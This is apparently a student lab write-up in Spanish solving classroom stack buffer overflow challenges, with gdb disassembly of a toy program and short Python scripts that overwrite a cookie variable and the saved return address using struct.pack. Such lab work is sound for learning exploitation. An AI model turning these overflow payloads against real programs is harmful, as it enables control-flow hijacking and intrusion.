# Escalera Pedro, Iman Federico

### Ej 3

#### Challenge 01:
resuelto en clase

#### Challenge 02: 
La unica diferencia es que ahora debemos ingresar el valor que le queremos ingrsar a la cookie directamente en hexa de esta forma: 

    f.write('A'*70 + '\x04' + '\x03' + '\x02' + '\x01')

ya que en ASCII estos valores representan caracteres de control SOH, STX, ETX  y EOT.

Por lo que se hace imposible llegar desde texto a los valores requeridos.

#### Challenge 01 y 02:

La combinacion de los challenges 1 y 2 es facil:

ej1 : 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA

ej2:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

ej 1 y 2:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA

#### Challenge 03: 
Este challenge no lo solucionamos de la misma forma que los anteriores. 

Lo que hicimos este caso es pisar el registro eip el cual contiene el Program counter, con la direccion del print dentro del if. para hacer esto solo debemos llenar el buf con 60 A lugo la cookie con 4 A, luego el registro ebp con 4 A mas obteniendo asi 68 A y luego ingresamos la direccion de memoria deseada para asi poder modificar el registro eip.
La direccion de memoria deseada se puede obtener dentro de gdb con el comando: 

    disas main
obteniendo: 

    0x08048438 <+0>:     push   %ebp

    0x08048439 <+1>:     mov    %esp,%ebp

    0x0804843b <+3>:     sub    $0x40,%esp

    0x0804843e <+6>:     movl   $0x0,-0x4(%ebp)

    0x08048445 <+13>:    lea    -0x40(%ebp),%eax

    0x08048448 <+16>:    push   %eax

    0x08048449 <+17>:    call   0x8048320 
    <gets@plt>
   
    0x0804844e <+22>:    add    $0x4,%esp
   
    0x08048451 <+25>:    cmpl   $0xd0a00,-0x4
    (%ebp)
   
    0x08048458 <+32>:    jne    0x8048467 <main+47>
   
    0x0804845a <+34>:    push   $0x8048544
   
    0x0804845f <+39>:    call   0x8048330 <puts@plt>
   
    0x08048464 <+44>:    add    $0x4,%esp
   
    0x08048467 <+47>:    mov    $0x0,%eax
   
    0x0804846c <+52>:    leave  
   
    0x0804846d <+53>:    ret   

Obteniendo en esta linea la direccion deseada:

    0x0804845a <+34>:    push   $0x8048544

Finalmente pasamos usamos la libreria struct con el metodo pack y la flag "<i" para pasar al 
la direccion de memoria en formato 	
little-endian(<) y como un int (i)

#### Challenge 01 y 03:

Aplicando la misma logica anterior podemos formar la solucion o con el sigueinte script:

    from struct import pack
    f = open('ej3', 'wb')
    f.write('A'*68+pack('<i', 0x0804845a)+'A'*8+'DCBA')
    f.close()

#### Challenge 02 y 03:

Para resolver estos challenge, cambiamos la solucion del 2 y lo solucionamos igual que el 3
es decir, pisamos el eip del challenge 2 para obtener un payload mas grande y asi poder meter la solucion del 3 en el mismo payload sin superposiciones. 


    f = open('ej2y3', 'wb')
    f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
